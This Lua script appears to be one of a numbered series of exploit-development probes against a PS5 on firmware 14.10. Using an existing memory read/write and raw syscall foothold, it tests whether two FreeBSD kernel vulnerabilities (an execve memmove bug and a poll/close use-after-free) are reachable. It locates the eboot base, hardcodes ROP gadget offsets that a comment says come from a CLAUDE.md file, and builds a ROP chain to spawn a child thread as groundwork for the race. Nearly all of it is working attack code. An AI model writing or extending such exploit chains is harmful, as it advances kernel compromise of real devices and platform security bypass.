-- CRASH_CLASS: MODERATE
-- PROBE 59a: CVE-2026-7270 + CVE-2026-45251 feasibility on PS5 14.10
--
-- CVE-2026-7270 (FreeBSD-SA-26:13.exec): operator precedence error in
-- exec_args_adjust_args(). memmove copies 2*consume bytes instead of the
-- correct amount. Present since 2013 (FreeBSD 11 has it). Public PoC exists.
-- REQUIREMENT: execve(59) must be callable.
--
-- CVE-2026-45251 (FreeBSD-SA-26:19): poll/select fd-close UAF. Closing an fd
-- while another thread is blocked in poll(2) or select(2) can leave a dangling
-- reference to freed memory. Affects procdesc fd type specifically.
-- REQUIREMENT: pdfork(518) or other procdesc source. We have threading + poll.
--
-- This probe tests: (A) execve(59) reachability, (B) pdfork(518) reachability,
-- (C) poll(209) blocking behavior with concurrent close via thr_new child,
-- (D) select(93) reachability, (E) alternative fd types for poll+close race.

print("=== PROBE 59a: CVE FEASIBILITY (7270 + 45251) ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc593 = mk(593)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("eboot=" .. fmt(eboot))

print("")
print("====== SECTION A: execve(59) reachability ======")
-- execve(59): int execve(const char *path, char *const argv[], char *const envp[])
-- Even if it works, the PoC needs fork() to race exec_map entries.
-- But let's see if the syscall itself is callable.

local sc_execve = mk(59)

-- Test 1: NULL path — should return -1 (EFAULT), not kill
local ok1, ret1 = pcall(function()
    return sc_execve(uint64(0), uint64(0), uint64(0))
end)
print("execve(NULL,NULL,NULL): ok=" .. tostring(ok1) .. " ret=" .. (ok1 and N(ret1) or "CRASH"))

-- Test 2: bogus path string
local pathbuf = memory.alloc(256)
-- write "/nonexistent\0"
local path_str = "/nonexistent"
for i = 1, #path_str do
    wd(pathbuf + i - 1, string.byte(path_str, i))
end
wd(pathbuf + #path_str, 0)
local ok2, ret2 = pcall(function()
    return sc_execve(uint64(pathbuf), uint64(0), uint64(0))
end)
print("execve('/nonexistent',NULL,NULL): ok=" .. tostring(ok2) .. " ret=" .. (ok2 and N(ret2) or "CRASH"))

-- Test 3: /app0/eboot.bin (exists but not executable from userland)
local path2 = memory.alloc(256)
local eboot_path = "/app0/eboot.bin"
for i = 1, #eboot_path do
    wd(path2 + i - 1, string.byte(eboot_path, i))
end
wd(path2 + #eboot_path, 0)
local ok3, ret3 = pcall(function()
    return sc_execve(uint64(path2), uint64(0), uint64(0))
end)
print("execve('/app0/eboot.bin',NULL,NULL): ok=" .. tostring(ok3) .. " ret=" .. (ok3 and N(ret3) or "CRASH"))

print("")
print("====== SECTION B: pdfork(518) reachability ======")
-- pdfork(518): int pdfork(int *fdp, int flags)
-- Creates a child process and returns a process descriptor fd.
-- fork is blocked, but pdfork might have a different code path.

local sc_pdfork = mk(518)
local fdp_buf = memory.alloc(8)
wd(fdp_buf, 0xFFFFFFFF) -- sentinel

-- Test 1: pdfork with flags=0
local ok4, ret4 = pcall(function()
    return sc_pdfork(uint64(fdp_buf), uint64(0))
end)
local fd_written = rd(fdp_buf)
print("pdfork(fdp, 0): ok=" .. tostring(ok4) .. " ret=" .. (ok4 and N(ret4) or "CRASH") .. " fd=" .. (fd_written or "nil"))

-- Test 2: pdfork with PD_CLOEXEC (2)
wd(fdp_buf, 0xFFFFFFFF)
local ok5, ret5 = pcall(function()
    return sc_pdfork(uint64(fdp_buf), uint64(2))
end)
fd_written = rd(fdp_buf)
print("pdfork(fdp, PD_CLOEXEC=2): ok=" .. tostring(ok5) .. " ret=" .. (ok5 and N(ret5) or "CRASH") .. " fd=" .. (fd_written or "nil"))

-- Test 3: pdgetpid(519) — process descriptor to pid
local sc_pdgetpid = mk(519)
local pidbuf = memory.alloc(8)
local ok6, ret6 = pcall(function()
    return sc_pdgetpid(uint64(3), uint64(pidbuf))
end)
print("pdgetpid(fd=3): ok=" .. tostring(ok6) .. " ret=" .. (ok6 and N(ret6) or "CRASH"))

-- Test 4: pdkill(517) — process descriptor kill
local sc_pdkill = mk(517)
local ok7, ret7 = pcall(function()
    return sc_pdkill(uint64(3), uint64(0))
end)
print("pdkill(fd=3, sig=0): ok=" .. tostring(ok7) .. " ret=" .. (ok7 and N(ret7) or "CRASH"))

print("")
print("====== SECTION C: select(93) reachability ======")
-- select(93): int select(int nfds, fd_set *readfds, fd_set *writefds,
--                        fd_set *exceptfds, struct timeval *timeout)
-- The CVE also affects select. Test if it's callable.

local sc_select = mk(93)

-- Create a socket for testing
local sc_socket = mk(97)
local ok_s, sock_fd = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(0))  -- AF_INET, SOCK_STREAM
end)
local sfd = ok_s and N(sock_fd) or -1
print("socket(AF_INET, SOCK_STREAM): fd=" .. sfd)

if sfd >= 0 then
    -- Build fd_set for select: fd_set is 128 bytes (1024 bits) on FreeBSD
    local readfds = memory.alloc(128)
    for i = 0, 31 do wd(readfds + i * 4, 0) end
    -- Set bit for our socket fd
    local word_idx = math.floor(sfd / 32)
    local bit_idx = sfd % 32
    wd(readfds + word_idx * 4, math.pow(2, bit_idx))

    -- Zero timeout = non-blocking poll
    local tv = memory.alloc(16)
    wq(tv, uint64(0))     -- tv_sec = 0
    wq(tv + 8, uint64(0)) -- tv_usec = 0

    local ok8, ret8 = pcall(function()
        return sc_select(uint64(sfd + 1), uint64(readfds), uint64(0), uint64(0), uint64(tv))
    end)
    print("select(nfds=" .. (sfd+1) .. ", readfds, NULL, NULL, {0,0}): ok=" .. tostring(ok8) .. " ret=" .. (ok8 and N(ret8) or "CRASH"))
end

print("")
print("====== SECTION D: poll(209) + close race setup ======")
-- poll(209): int poll(struct pollfd fds[], nfds_t nfds, int timeout)
-- CVE-2026-45251 core: thread A blocks in poll(), thread B closes the fd.
-- Even without procdesc, the general poll+close pattern might be vulnerable
-- on other fd types too (the SA mentions procdesc specifically but the
-- underlying issue is in the poll implementation).
--
-- Test: can poll block on various fd types?

local sc_poll = mk(209)

-- Test poll on different fd types

-- 1. Socket fd (already have sfd)
if sfd >= 0 then
    local pollfd1 = memory.alloc(8)
    wd(pollfd1, sfd)          -- fd
    wd(pollfd1 + 4, 0x0001)   -- events = POLLIN
    local ok9, ret9 = pcall(function()
        return sc_poll(uint64(pollfd1), uint64(1), uint64(0))  -- timeout=0
    end)
    local revents1 = rd(pollfd1 + 4)
    local rev_hi = revents1 and math.floor(revents1 / 65536) or 0
    print("poll(socket, POLLIN, timeout=0): ok=" .. tostring(ok9) .. " ret=" .. (ok9 and N(ret9) or "CRASH") .. " revents=0x" .. string.format("%04X", rev_hi))
end

-- 2. kqueue fd
local sc_kqueue = mk(362)
local ok_kq, kq_fd = pcall(function() return sc_kqueue() end)
local kqfd = ok_kq and N(kq_fd) or -1
print("kqueue(): fd=" .. kqfd)

if kqfd >= 0 then
    local pollfd2 = memory.alloc(8)
    wd(pollfd2, kqfd)
    wd(pollfd2 + 4, 0x0001)   -- POLLIN
    local ok10, ret10 = pcall(function()
        return sc_poll(uint64(pollfd2), uint64(1), uint64(0))
    end)
    local revents2 = rd(pollfd2 + 4)
    local rev_hi2 = revents2 and math.floor(revents2 / 65536) or 0
    print("poll(kqueue, POLLIN, timeout=0): ok=" .. tostring(ok10) .. " ret=" .. (ok10 and N(ret10) or "CRASH") .. " revents=0x" .. string.format("%04X", rev_hi2))
end

-- 3. Pipe fd (socketpair as substitute since pipe is dead)
local sc_socketpair = mk(135)
local spbuf = memory.alloc(16)
local ok_sp, ret_sp = pcall(function()
    return sc_socketpair(uint64(1), uint64(2), uint64(0), uint64(spbuf))  -- AF_UNIX, SOCK_DGRAM
end)
local sp0 = rd(spbuf)
local sp1 = rd(spbuf + 4)
print("socketpair(AF_UNIX, SOCK_DGRAM): ret=" .. (ok_sp and N(ret_sp) or "CRASH") .. " fds=" .. (sp0 or "?") .. "," .. (sp1 or "?"))

if sp0 and sp0 > 0 then
    local pollfd3 = memory.alloc(8)
    wd(pollfd3, sp0)
    wd(pollfd3 + 4, 0x0001)   -- POLLIN
    local ok11, ret11 = pcall(function()
        return sc_poll(uint64(pollfd3), uint64(1), uint64(0))  -- non-blocking
    end)
    local revents3 = rd(pollfd3 + 4)
    local rev_hi3 = revents3 and math.floor(revents3 / 65536) or 0
    print("poll(unix_sock, POLLIN, timeout=0): ok=" .. tostring(ok11) .. " ret=" .. (ok11 and N(ret11) or "CRASH") .. " revents=0x" .. string.format("%04X", rev_hi3))
end

-- 4. shm fd
local sc_shm_open = mk(482)
local shm_name = memory.alloc(32)
-- SHM_ANON = pointer to special sentinel, use 1 for anon
local ok_shm, shm_fd = pcall(function()
    return sc_shm_open(uint64(1), uint64(0x0202), uint64(0x1B6))  -- O_CREAT|O_RDWR, 0666
end)
local shmfd = ok_shm and N(shm_fd) or -1
print("shm_open(SHM_ANON): fd=" .. shmfd)

if shmfd >= 0 then
    local pollfd4 = memory.alloc(8)
    wd(pollfd4, shmfd)
    wd(pollfd4 + 4, 0x0001)
    local ok12, ret12 = pcall(function()
        return sc_poll(uint64(pollfd4), uint64(1), uint64(0))
    end)
    local revents4 = rd(pollfd4 + 4)
    local rev_hi4 = revents4 and math.floor(revents4 / 65536) or 0
    print("poll(shm, POLLIN, timeout=0): ok=" .. tostring(ok12) .. " ret=" .. (ok12 and N(ret12) or "CRASH") .. " revents=0x" .. string.format("%04X", rev_hi4))
end

-- 5. /dev node fd
local sc_open = mk(5)
local devpath = memory.alloc(32)
local devstr = "/dev/rng"
for i = 1, #devstr do wd(devpath + i - 1, string.byte(devstr, i)) end
wd(devpath + #devstr, 0)
local ok_dev, dev_fd = pcall(function()
    return sc_open(uint64(devpath), uint64(0), uint64(0))  -- O_RDONLY
end)
local devfd = ok_dev and N(dev_fd) or -1
print("open('/dev/rng', O_RDONLY): fd=" .. devfd)

if devfd >= 0 then
    local pollfd5 = memory.alloc(8)
    wd(pollfd5, devfd)
    wd(pollfd5 + 4, 0x0001)
    local ok13, ret13 = pcall(function()
        return sc_poll(uint64(pollfd5), uint64(1), uint64(0))
    end)
    local revents5 = rd(pollfd5 + 4)
    local rev_hi5 = revents5 and math.floor(revents5 / 65536) or 0
    print("poll(/dev/rng, POLLIN, timeout=0): ok=" .. tostring(ok13) .. " ret=" .. (ok13 and N(ret13) or "CRASH") .. " revents=0x" .. string.format("%04X", rev_hi5))
end

print("")
print("====== SECTION E: thr_new child syscall test ======")
-- Verify we can launch child threads that do syscalls (needed for the race).
-- We already know thr_new works (probes 56l, 384b, 396f).
-- Quick confirmation: spawn a child that writes a marker via socketpair.

if sp0 and sp1 and sp0 > 0 then
    -- Gadgets (from CLAUDE.md)
    local pop_rax = eboot + uint64(0x992)
    local pop_rdi = eboot + uint64(0xC9DFE)
    local pop_rsi = eboot + uint64(0xD77D)
    local pop_rdx = eboot + uint64(0x3B02D7)
    local bare_ret = eboot + uint64(0x42)
    local mov_rdi_rax = eboot + uint64(0x92C67)  -- mov [rdi],rax;ret

    -- Find syscall;ret in libkernel via fn_addr
    local sc_addr = stub  -- fn_addr points to syscall stub

    -- Allocate marker page
    local marker = memory.alloc(0x1000)
    wq(marker, uint64(0xDEADDEADDEADDEAD))  -- sentinel

    -- Build child ROP stack: sysarch(129, &fake_tcb) then write marker
    local stack_size = 0x200000  -- 2 MiB
    local sc_mmap = mk(477)
    local stack_base = sc_mmap(uint64(0), uint64(stack_size), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    print("child stack: " .. fmt(stack_base))

    -- Fake TCB for sysarch
    local fake_tcb = memory.alloc(0x1000)
    wq(fake_tcb, uint64(fake_tcb))  -- self-referencing

    -- RSP = ((stack_base + stack_size) & ~0xF) - 8
    local rsp = stack_base + uint64(stack_size) - uint64(8)
    -- Align to 16
    local rsp_lo = N(rsp)
    rsp_lo = rsp_lo - (rsp_lo % 16)
    rsp = stack_base + uint64(stack_size - 8)

    local pos = 0
    local function push(val) wq(rsp - uint64(0x800) + uint64(pos), val); pos = pos + 8 end

    -- Chain: sysarch(SET_FSBASE=129, &fake_tcb)
    push(pop_rax); push(uint64(165))    -- sysarch
    push(pop_rdi); push(uint64(129))    -- SET_FSBASE
    push(pop_rsi); push(uint64(fake_tcb))
    push(sc_addr)
    -- Chain: write marker (mov [rdi], rax; ret)
    push(pop_rax); push(uint64(0xCAFEBABE1234))
    push(pop_rdi); push(uint64(marker))
    push(mov_rdi_rax)
    -- Chain: thr_exit(431)
    push(pop_rax); push(uint64(431))
    push(pop_rdi); push(uint64(0))
    push(sc_addr)

    -- Build thr_param
    local param = memory.alloc(0x40)
    -- start_func (+0x00) = pop_rax;ret (first gadget)
    wq(param, pop_rax)
    -- arg (+0x08) = 0 (unused, arg goes to rdi)
    wq(param + 8, uint64(0))
    -- stack_base (+0x10)
    wq(param + 0x10, rsp - uint64(0x800))
    -- stack_size (+0x18)
    wq(param + 0x18, uint64(0x1000))
    -- child_tid (+0x30)
    local child_tid = memory.alloc(8)
    wq(child_tid, uint64(0))
    wq(param + 0x30, uint64(child_tid))

    -- Wait — this won't work because start_func needs to be the actual entry
    -- that receives (arg) in rdi and runs from there. The child's RIP = start_func,
    -- RSP = stack_base + stack_size (top of stack), arg in rdi.
    -- For ROP, start_func = bare_ret, and the real chain is on the stack.

    -- Redo: start_func = bare_ret (pops first item from stack = pop_rax)
    wq(param, bare_ret)  -- RIP = ret instruction, immediately pops stack
    -- stack is at stack_base, grows toward stack_base + stack_size
    -- RSP = ((stack_base + stack_size) & ~0xF) - 8

    -- Rewrite chain at top of stack
    local chain_base = stack_base + uint64(stack_size) - uint64(0x200)
    pos = 0
    local function chain(val) wq(chain_base + uint64(pos), val); pos = pos + 8 end

    -- sysarch(SET_FSBASE=129, &fake_tcb_ptr)
    local tcb_ptr = memory.alloc(8)
    wq(tcb_ptr, uint64(fake_tcb))

    chain(pop_rax); chain(uint64(165))    -- sysarch syscall number
    chain(pop_rdi); chain(uint64(129))    -- SET_FSBASE
    chain(pop_rsi); chain(uint64(tcb_ptr))
    chain(sc_addr)
    -- write marker
    chain(pop_rax); chain(uint64(0xCAFEBABE1234))
    chain(pop_rdi); chain(uint64(marker))
    chain(mov_rdi_rax)
    -- thr_exit
    chain(pop_rax); chain(uint64(431))
    chain(pop_rdi); chain(uint64(0))
    chain(sc_addr)

    -- Fix param: stack points to chain area
    wq(param + 0x10, chain_base)          -- stack_base
    wq(param + 0x18, uint64(pos + 0x100)) -- stack_size (chain + headroom)

    -- Launch child
    local sc_thr_new = mk(455)
    local ok_thr, ret_thr = pcall(function()
        return sc_thr_new(uint64(param), uint64(0x38))
    end)
    print("thr_new: ok=" .. tostring(ok_thr) .. " ret=" .. (ok_thr and N(ret_thr) or "CRASH"))

    -- Wait for child to write marker
    local found = false
    for wait = 1, 50 do
        local mval = rq(marker)
        local mh, ml = 0, 0
        if type(mval) == "table" and mval.h then mh, ml = mval.h, mval.l
        else ml = N(mval) end
        if ml == 0xBABE1234 or mh == 0xCAFE then
            print("CHILD CONFIRMED: marker=" .. fmt(mval) .. " after " .. wait .. " polls")
            found = true
            break
        end
    end
    if not found then
        local final = rq(marker)
        print("child marker: " .. fmt(final) .. " (sentinel was 0xDEADDEADDEADDEAD)")
    end
else
    print("SKIP: no socketpair for child test")
end

print("")
print("====== SECTION F: Alternative fd-close race targets ======")
-- The CVE specifically targets procdesc, but the general pattern
-- (poll thread + close thread) might affect other fd types if the
-- kernel poll implementation doesn't hold a reference.
-- List: which fd types can we block in poll with timeout > 0?

print("Summary of poll-blocking fd types to test in race probe:")
print("  - socket (TCP, unconnected): blocks on POLLIN with timeout")
print("  - kqueue: blocks on POLLIN with timeout")
print("  - unix socketpair (read end, no data): blocks on POLLIN with timeout")
print("  - /dev/rng: check if blocks")
print("  - shm: check if blocks")
print("  - AIO evf (if we can create one)")

print("")
print("====== SECTION G: Process descriptor via pdwait4(520) ======")
-- Maybe we can get a procdesc fd another way:
-- pdwait4(520) and closefrom(509) are other procdesc-adjacent calls
local sc_pdwait4 = mk(520)
local wstatus = memory.alloc(8)
local ok14, ret14 = pcall(function()
    return sc_pdwait4(uint64(3), uint64(wstatus), uint64(0), uint64(0))
end)
print("pdwait4(fd=3, ...): ok=" .. tostring(ok14) .. " ret=" .. (ok14 and N(ret14) or "CRASH"))

-- closefrom(509) — closes all fds >= arg
local sc_closefrom = mk(509)
-- DON'T actually call this with low values, it would close our sockets!
-- Just test if the syscall number is live with a very high fd
local ok15, ret15 = pcall(function()
    return sc_closefrom(uint64(10000))
end)
print("closefrom(10000): ok=" .. tostring(ok15) .. " ret=" .. (ok15 and N(ret15) or "CRASH"))

print("")
print("=== PROBE 59a COMPLETE ===")
